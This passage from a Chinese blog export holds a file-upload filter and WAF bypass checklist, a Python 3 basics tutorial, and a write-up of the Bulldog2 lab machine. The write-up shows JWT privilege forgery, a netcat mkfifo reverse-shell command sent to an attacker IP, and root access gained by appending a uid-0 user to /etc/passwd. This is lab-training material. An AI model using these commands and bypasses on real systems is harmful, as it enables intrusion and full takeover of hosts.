    <content type="text"><![CDATA[参考链接：https://xz.aliyun.com/t/1991 前端验证 一般在网页上写一段javascript脚本，检验上传文件的后缀名，白名单或者黑名单形式 判断方法：浏览加载文件，但还未点击上传按钮时便弹出对话框，例：只允许上传.jpg .jpeg .png后缀名的文件，而此时并没有发送数据包 绕过方法：先上传 .jpg，burpsuite 抓包，将.jpg修改为 .php .asp等 服务端验证 文件名验证 白名单绕过方法 一般通过解析漏洞构造，如 %00截断，0x00截断等。 参考链接： https://www.jianshu.com/p/224ac688d135 黑名单绕过方法 a. 找容易忽视的后缀名，例 .cer 等 b. 上传 .htaccess c. 后缀大小写绕过 d. 点绕过 e. 空格绕过 f. ::$DATA绕过 g. 配合解析漏洞 文件内容验证 a. 针对文件头 content-type 字段校验（image/gif）绕过方法 b. 突破getimagesize() c. 突破exif_imagetype() d. 二次渲染 WAF 设备验证 垃圾数据 有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可绕过WAF对文件内容的校验，也可将垃圾数据放在数据包最开头，绕过对文件名的校验 filename 可以参考文件名绕过方法，包括路径等等形式来对这个方法的限制进行绕过。可以考虑的点还有多个文件名，加入路径，利用重名命等。 提交方法混淆 有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。 此种情况可以上传一个POST型的数据包，抓包将POST改为GET。然后仍然传输POST的数据。 利用waf本身缺陷删除实体里面的Conten-Type字段 可以参考基与文件内容的绕过方法，可以利用多种形式对Conten-Type进行绕过。]]></content>
      <categories>
        <category>漏洞学习</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Python-3-学习]]></title>
    <url>%2F2018%2F12%2F09%2FPython-3-%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[注：制表符缩进和空格缩进不能同时使用 一类 基础语法python2 与 python3 区别输入输出： python2 : raw_input() / input() print &quot;hello&quot; python3 : input() print (&quot;hello&quot;) 数字类型： python2 没有布尔型，数字0表示False，数字1表示True python3 中True和False定义成关键字，但值还是1，0，可以和数字相加 常用格式化：tpl = &quot;i am %s&quot; % &quot;alex&quot; tpl = &quot;i am %s age %d&quot; % (&quot;alex&quot;, 18) tpl = &quot;i am %(name)s age %(age)d&quot; % {&quot;name&quot;: &quot;alex&quot;, &quot;age&quot;:18} tpl = &quot;percent %.2f&quot; % 99.97623 tpl = &quot;i am %(pp).2f&quot; % {&quot;pp&quot;: 123.425556, } tpl = &quot;i am %.2f %%&quot; % {&quot;pp&quot;: 123.425556, } python中常见字符串处理函数：string.capitalize() // 把字符串的第一个字符大写 string.decode(encoding=&apos;UTF-8&apos;, errors=&apos;strict&apos;) // 以 encoding 指定的编码格式解码 string，如果出错默认报一个 ValueError 的 异 常 ， 除非 errors 指 定 的 是 &apos;ignore&apos; 或 者&apos;replace&apos; string.encode(encoding=&apos;UTF-8&apos;, errors=&apos;strict&apos;) // 以 encoding 指定的编码格式编码 string，如果出错默认报一个ValueError 的异常，除非 errors 指定的是&apos;ignore&apos;或者&apos;replace&apos; string.find(str, beg=0, end=len(string)) // 检测 str 是否包含在 string 中，如果 beg 和 end 指定范围，则检查是否包含在指定范围内，如果是返回开始的索引值，否则返回-1 string.format() // 格式化字符串 string.lstrip() // 去除字符串左边的空格 string.rstrip() // 去除字符串右边的空格 string.strip() // 去除字符串两边的空格 string.replace(str1, str2, num=string.count(str1)) // 把 string 中的 str1 替换成 str2,如果 num 指定，则替换不超过 num 次 列表list1=[&quot;how&quot;,&quot;are&quot;] list2=[&quot;you&quot;,&quot;?&quot;] print (list1[0]) #读取列表中第一个元素 print (list1[0:2]) #从第一个元素开始截取列表 截取个数为2 print (list2*2) #将列表中元素重复 print (lis t1+list2) #列表中数据组合 list1.append(&quot;hello&quot;) #在列表最后添加新的元素 print (list1) del(list1[2]) #删除索引为2的元素 print (list1) list3=&quot;fine&quot; print (list(list3)) #输出[&apos;f&apos;, &apos;i&apos;, &apos;n&apos;, &apos;e&apos;] list4=(&quot;asd&quot;,&quot;ds&quot;,&quot;qw&quot;) print (list(list4)) #将元素转换为列表 元组注: 元组中元素值不允许被修改，但可对其进行连接组合，生成新的元组 元组创建方法： tup1 = (&apos;physics&apos;, &apos;chemistry&apos;, 1997, 2000) tup2 = (1, 2, 3, 4, 5 ) tup3 = &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot; tup4=(&quot;a&quot;,) #元组中只包含一个元素时，需要在元素后面添加逗号 tuple(tup) #将列表转换为元祖 cmp(tuple1, tuple2) #比较的元素是同类型的,则比较其值,返回结果；两个元素不是同一种类型,则检查它们是否是数字，如果是数字,执行必要的数字强制类型转换,然后比较。如果有一方的元素是数字,则另一方的元素&quot;大&quot;(数字是&quot;最小的&quot;) 。否则,通过类型名字的字母顺序进行比较 len(tuple1, tuple2) #计算元组元素个数 max(tuple) #返回元组中元素最大值 min(tuple) #返回元组中元素最小值 del tup; #删除元组 字典内置函数 列表是有序的对象集合，字典是无序的对象集合 键一般是唯一的，如果重复最后的一个键值对会替换前面的，值不需要唯一 值可以取任何数据类型，但键必须是不可变的，如字符串，数字或元组 d={key1:value1,key2:values} cmp(dict1, dict2) #字典元素相同则返回0，如果dict1大于dict2返回1，如果字典dict1小于字典dict2返回-1 len(dict) #返回字典的元素个数，即键的总数 str(dict) #返回字符串 type(dict) #返回输入的变量类型 内置方法 dict.clear() #删除字典内所有元素 dict.copy() #返回一个字典的浅复制 实例： d={&quot;zhang&quot;:123,&quot;liu&quot;:456,&quot;zhao&quot;:789} d1=d.copy() # 浅拷贝：深拷贝父对象（一级目录），子对象（二级目录）不拷贝，还是引用 d2=d # 浅拷贝: 引用对象 print (d1) #输出 {&apos;zhang&apos;: 123, &apos;liu&apos;: 456, &apos;zhao&apos;: 789} print (d2) #输出 {&apos;zhang&apos;: 123, &apos;liu&apos;: 456, &apos;zhao&apos;: 789} d[&quot;zhang&quot;]=111 print (d1) #输出 {&apos;zhang&apos;: 123, &apos;liu&apos;: 456, &apos;zhao&apos;: 789} print (d2) #输出 {&apos;zhang&apos;: 111, &apos;liu&apos;: 456, &apos;zhao&apos;: 789} 集合注：创建一个空集合必须用 set() 而不是 { }，因为 { } 是用来创建一个空字典。 s.add( x ) #将元素 x 添加到集合 s 中，如果元素已存在，则不进行任何操作 s.remove( x ) #将元素 x 添加到集合 s 中移除，如果元素不存在，则会发生错误 s.discard( x ) #移除集合中的元素，且如果元素不存在，不会发生错误 s.pop() #随机删除集合中的一个元素 s.clear() #清空集合s len(s) #计算集合 s 元素个数 x in s #判断元素 s 是否在集合 x 中存在，存在返回 True，不存在返回 False python 位运算符a = 0011 1100 b = 0000 1101 a&amp;b = 0000 1100 # 按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0 a|b = 0011 1101 # 按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1。 a^b = 0011 0001 # 按位异或运算符：当两对应的二进位相异时，结果为1 ~a = 1100 0011 # 按位取反运算符：对数据的每个二进制位取反,即把1变为0,把0变为1。~x 类似于 -x-1 python 逻辑运算符x and y # 布尔&quot;与&quot; - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值 x or y # 布尔&quot;或&quot; - 如果 x 是 True，它返回 x 的值，否则它返回 y 的计算值 not x # 布尔&quot;非&quot; - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True python 传不可变对象实例def ChangeInt( a ): a = 10 b = 2 ChangeInt(b) print( b ) # 结果是 2 实例中有 int 对象 2，指向它的变量是 b，在传递给 ChangeInt 函数时，按传值的方式复制了变量 b，a 和 b 都指向了同一个 Int 对象，在 a=10 时，则新生成一个 int 值对象 10，并让 a 指向它 传可变对象实例# 定义可修改函数 def changeme( mylist ): mylist.append([1,2,3,4]) print (&quot;函数内取值: &quot;, mylist) 输出 函数内取值: [10, 20, 30, [1, 2, 3, 4]] return # 调用changeme函数 mylist = [10,20,30] changeme( mylist ) print (&quot;函数外取值: &quot;, mylist) #输出 函数外取值: [10, 20, 30, [1, 2, 3, 4]] 不定长参数 加了星号 * 的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数 实例： def printinfo( arg1, *vartuple ): print (arg1) print (vartuple) printinfo( 70, 60, 50 ) # 输出 70 # （60,50） 加了两个星号 ** 的参数会以字典的形式导入 实例： def printinfo( arg1, **vardict ): print (arg1) print (vardict) printinfo(1, a=2,b=3) # 输出 1 # {&apos;a&apos;: 2, &apos;b&apos;: 3} 变量作用域Python的作用域一共有4种 L （Local） 局部作用域 E （Enclosing） 闭包函数外的函数中 G （Global） 全局作用域 B （Built-in） 内建作用域 以 L –&gt; E –&gt; G –&gt;B 的规则查找，即：在局部找不到，便会去局部外的局部找（例如闭包），再找不到就会去全局找，再者去内建中找 x = int(2.9) # 内建作用域 g_count = 0 # 全局作用域 def outer(): o_count = 1 # 闭包函数外的函数中 def inner(): i_count = 2 # 局部作用域 nonlocal 关键字 nonlocal适用于嵌套函数中内部函数修改外部变量的值 实例： def outer(): num = 10 def inner(): nonlocal num # nonlocal关键字声明 num = 100 print(num) #输出 100 inner() print(num) #输出 100 outer() 列表推导式 实例1 l=[&quot; ho w&quot;,&quot; are &quot;,&quot;you &quot;] print ([l1.strip() for l1 in l]) #输出 [&apos;ho w&apos;, &apos;are&apos;, &apos;you&apos;] 实例2： l=[123,45,3] print ([l1*2 for l1 in l if l1 &gt; 2]) #输出 [246, 90, 6] 实例3 l1=[1,2,3] l2=[11,12,13] l3=[x*y for x in l1 for y in l2] print (l3) #输出 [11, 12, 13, 22, 24, 26, 33, 36, 39]]]></content>
      <categories>
        <category>Python</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[渗透测试-靶机Bulldog2]]></title>
    <url>%2F2018%2F12%2F09%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E9%9D%B6%E6%9C%BABulldog2%2F</url>
    <content type="text"><![CDATA[参考链接：https://www.anquanke.com/post/id/160755 攻击机 ip：192.168.60.230靶机 ip：192.168.30.231 端口扫描这里仍然使用 nmap nmap -sV -p- 192.168.60.231 查看到只开放了一个 80端口 访问web页面，通过指纹识别工具查询到编程语使用的是Node.js，服务器Nginx 端口探测后开始进行目录探测，这里使用Dirbuster 没有查询到可以直接利用的目录，访问web页面发现Register功能点击Register报错，查看源代码发现四个js文件，在main.8b490782e52b9899e2a7.bundle.js文件中查找Register注册要求显示Content-Type字段值为application/json必须使用post方法提交数据，地址为users/register提交参数有四个如图浏览器抓包更改数据包并发送显示成功注册 登录注册的用户，登录时抓包，发现返回包带有一个JWT开头的token字段百度了一下 Json web token（JWT）的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。JWT解密后发现auth_level参数再在js文件中查询一下，发现值为master_admin_user时为admin用户 将auth_level设置值后，返回进行JWT加密并发送数据包返回web页面发现用户变更admin 在修改密码页面存在命令执行漏洞，反弹shellkali对4050端口进行监听 root@kali:~# nc -lvp 4050 在密码处执行反弹shell命令并发送包 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.60.230 4050 &gt;/tmp/f 此时kali成功拿到shell使用python命令获得一个标准shell(直接获取到的shell是真的难用的不行) python -c “import pty;pty.spawn(‘/bin/bash’)” 拿到shell后开始进行提权创建一个新用户 $ perl -le ‘print crypt(“pass”,”fairy”)’ 将新用户生成的密文写进/etc/passwd文件 $ echo ‘fairy:faa8LvXdAzuag:0:0:fairy:/root:/bin/bash’ &gt;&gt; /etc/passwd 查看/etc/passwd 文件 cat /etc/passwd 登录刚刚创建的fairy用户，成功提权至root用户]]></content>
      <categories>
        <category>靶机测试</category>
      </categories>
  </entry>
</search>
